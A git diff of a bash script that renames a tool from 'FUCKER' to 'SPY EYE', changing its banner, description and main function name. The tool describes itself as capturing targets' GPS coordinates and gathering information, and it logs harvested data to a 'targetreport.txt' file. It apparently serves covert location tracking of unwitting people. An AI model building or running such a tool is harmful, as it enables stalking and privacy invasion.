@@ -1,5 +1,5 @@
 #!/bin/bash
-# FUCKER v 1.3
+# SPY EYE v 1.3
 # Powered by ATHEX
 # visit https://youtube.com/inziXploit444
 
@@ -7,15 +7,15 @@ trap 'printf "\n";stop' 2
 
 banner() {
 clear
-printf '\n   ███████╗██╗   ██╗ ██████╗██╗  ██╗███████╗██████╗ \n' 
-printf '     ██╔════╝██║   ██║██╔════╝██║ ██╔╝██╔════╝██╔══██ \n'
-printf '     ████╗   ██║   ██║██║     █████╔╝ █████╗  ██████╔ \n'
-printf '     ██╔══╝  ██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗\n'
-printf '     ██║     ╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║
-             ╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ \n\n'
+printf '\n ███████╗██████╗ ██╗   ██╗    ███████╗██╗   ██╗███████╗ \n' 
+printf '   ██╔════╝██╔══██╗╚██╗ ██╔╝    ██╔════╝╚██╗ ██╔╝██╔════╝ \n'
+printf '   ███████╗██████╔╝ ╚████╔╝     █████╗   ╚████╔╝ █████╗ \n'
+printf '   ╚════██║██╔═══╝   ╚██╔╝      ██╔══╝    ╚██╔╝  ██╔══╝ \n'
+printf '   ███████║██║        ██║       ███████╗   ██║   ███████╗
+           ╚══════╝╚═╝        ╚═╝       ╚══════╝   ╚═╝   ╚══════╝ \n\n'
 printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'                                                                                
-printf " \e[1;93m      FUCKER Ver 1.3 - by ATHEX [YT - inziXploit444]\e[0m \n"
-printf "\e[1;90m FUCKER is a simple and light tool for information gathering and capture GPS coordinates.\e[0m \n"
+printf " \e[1;93m      Spy Eye Ver 1.3 - by ATHEX [YT - inziXploit444]\e[0m \n"
+printf "\e[1;90m SPY EYE is a simple and light tool for information gathering and capture GPS coordinates.\e[0m \n"
 printf "\n"
 }
 
@@ -113,7 +113,7 @@ php -S 127.0.0.1:8080 > /dev/null 2>&1 &
 sleep 2
 checkfound
 }
-FUCKER() {
+SPYEYE() {
 if [[ -e data.txt ]]; then
 cat data.txt >> targetreport.txt
 rm -rf data.txt
@@ -137,4 +137,4 @@ fi
 
 banner
 dependencies
-FUCKER
+SPYEYE
